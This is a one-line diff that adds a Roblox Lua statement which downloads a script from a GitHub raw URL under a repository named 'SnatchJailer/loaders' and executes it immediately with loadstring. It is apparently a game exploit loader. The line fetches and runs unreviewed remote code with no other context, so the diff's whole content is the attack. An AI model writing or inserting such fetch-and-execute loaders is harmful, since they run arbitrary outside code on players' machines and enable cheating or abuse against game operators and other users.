@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/wanted-update-spam6-mywaby5xl5u74e.lua"))()
